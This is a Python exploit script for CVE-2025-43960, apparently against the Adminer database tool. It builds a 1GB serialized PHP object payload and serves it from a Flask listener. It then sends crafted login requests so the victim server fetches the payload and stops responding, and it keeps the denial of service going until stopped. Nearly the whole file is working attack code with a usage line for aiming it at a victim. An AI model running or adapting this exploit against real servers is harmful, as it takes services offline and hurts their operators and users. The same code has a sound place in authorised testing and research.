#!/usr/bin/env python3
import os
import sys
import subprocess
from flask import Flask, request, Response
import requests
import threading
import time
from urllib.parse import quote

app = Flask(__name__)
PAYLOAD_FILE = "payload.txt"
FILLER_FILE = "filler.txt"
PAYLOAD_SIZE = 1000000000  # 1GB // @farr0t01 - The security test was performed using only 1GB of data.

def generate_payload():
    print("[*] Generating filler data using Unix commands...")
    try:
        subprocess.run(
            "head -c 1000000000 </dev/zero | tr '\\0' 'D' > filler.txt",
            shell=True,
            check=True
        )
        
        with open('filler.txt', 'r') as filler, open('payload.txt', 'w') as payload:
            payload.write(
                'O:32:"Monolog\\Handler\\SyslogUdpHandler":2:{\n'
                '  s:9:"*socket";r:2;\n'
                '  s:10:"*handler";s:1000000000:"'
            )
            chunk_size = 1024*1024
            while True:
                chunk = filler.read(chunk_size)
                if not chunk:
                    break
                payload.write(chunk)
            payload.write('";\n}')
        
        print(f"[+] Payload generated successfully in {PAYLOAD_FILE}")
        print("[+] File sizes:")
        print(f"  - filler.txt: {os.path.getsize(FILLER_FILE)/1000000:.2f} MB")
        print(f"  - payload.txt: {os.path.getsize(PAYLOAD_FILE)/1000000:.2f} MB")
        
    except subprocess.CalledProcessError as e:
        print(f"[-] Error generating payload: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        sys.exit(1)

@app.route('/', methods=['GET', 'POST'])
@app.route('/payload.txt/', methods=['GET', 'POST'])
def respond():
    try:
        client_ip = request.remote_addr
        print(f"\n[+] Request from {client_ip} - {request.method} {request.path}")
        print("Headers:")
        for header, value in request.headers.items():
            print(f"  {header}: {value}")
        print(f"Data: {request.data.decode() if request.data else 'None'}")
        
        if request.path == '/payload.txt/':
            with open(PAYLOAD_FILE, 'r') as file:
                payload = file.read()
            return payload
        return Response("", status=200)
    except Exception as e:
        print(f"[-] Error serving payload: {e}")
        return Response("Error", status=500)

def run_flask_server(port=80):
    print("[*] Starting Flask server...")
    from werkzeug.serving import WSGIRequestHandler
    WSGIRequestHandler.protocol_version = "HTTP/1.1"
    app.run(host='0.0.0.0', port=port, threaded=True)

def send_exploit(target_url, listener_url):
    print(f"\n[*] Sending exploit to {target_url}")
    
    try:
        print("[*] Getting fresh session cookies...")
        sess = requests.Session()
        home_resp = sess.get(target_url, timeout=10)
        if home_resp.status_code != 200:
            print(f"[-] Failed to get initial session (HTTP {home_resp.status_code})")
            return False
    except Exception as e:
        print(f"[-] Error getting initial session: {e}")
        return False

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9,es;q=0.8',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': target_url,
        'Referer': f'{target_url}/',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'
    }
    
    data = {
        'auth[driver]': 'elastic',
        'auth[server]': f'{listener_url}/payload.txt/',
        'auth[username]': '',
        'auth[password]': '',
        'auth[db]': ''
    }
    
    print("\n[*] Sending first request (POST)...")
    try:
        response = sess.post(
            target_url,
            headers=headers,
            data=data,
            verify=False,
            timeout=15,
            allow_redirects=False
        )
        
        print(f"[+] First request completed. Status: {response.status_code}")
        print("Response headers:")
        for header, value in response.headers.items():
            print(f"  {header}: {value}")
        
        if response.status_code == 302:
            print("[+] Got expected 302 redirect")
            redirect_location = response.headers.get('Location', '')
            print(f"  Location: {redirect_location}")
        else:
            print("[-] Unexpected response to first request")
            return False
        
    except Exception as e:
        print(f"[-] Error sending first request: {e}")
        return False
    
    print("\n[*] Sending second request (GET)...")
    try:
        response = sess.get(
            f"{target_url}/?elastic={quote(listener_url + '/payload.txt/')}&username=",
            headers={k: v for k, v in headers.items() if k != 'Content-Type'},
            verify=False,
            timeout=15,
            allow_redirects=False
        )
        
        print(f"[+] Second request completed. Status: {response.status_code}")
        print("Response headers:")
        for header, value in response.headers.items():
            print(f"  {header}: {value}")
        
        if response.status_code == 500:
            print("[+] Got expected 500 error - vulnerability likely exploited!")
            return True
        else:
            print("[-] Unexpected response to second request")
            return False
        
    except requests.exceptions.ReadTimeout:
        print("\n[!] The application has stopped responding (timeout occurred)")
        print("[+] This likely indicates a successful Denial of Service condition")
        print("[+] The target server is now vulnerable and unresponsive")
        return True
    except Exception as e:
        print(f"[-] Error sending second request: {e}")
        return False

def main():
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <ip-listener> <port-listener> <ip-victim:port>")
        print("Example: python3 cve-2025-43960.py 198.51.100.11 80 203.0.113.11:8000")
        sys.exit(1)
    
    listener_ip = sys.argv[1]
    exploit_port = int(sys.argv[2])
    victim = sys.argv[3]
    
    if not victim.startswith('http'):
        victim = f'http://{victim}'
    
    listener_url = f'http://{listener_ip}:{exploit_port}'
    
    generate_payload()
    
    flask_thread = threading.Thread(target=run_flask_server, args=(exploit_port,), daemon=True)
    flask_thread.start()
    
    print("[*] Waiting 2 seconds for server to start...")
    time.sleep(2)
    
    success = send_exploit(victim, listener_url)
    
    if success:
        print("\n[+] Exploit successfully executed! Server should be in DoS state.")
    else:
        print("\n[-] Exploit attempt failed. Check output for details.")
    
    print("[*] Keeping server running to maintain DoS state...")
    print("@far00t01 - Developed for penetration testing in controlled environments ;D")
    print("[*] Press Ctrl+C to stop")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        try:
            os.remove(FILLER_FILE)
            os.remove(PAYLOAD_FILE)
            print("[+] Temporary files cleaned up")
        except:
            pass

if __name__ == '__main__':
    main()
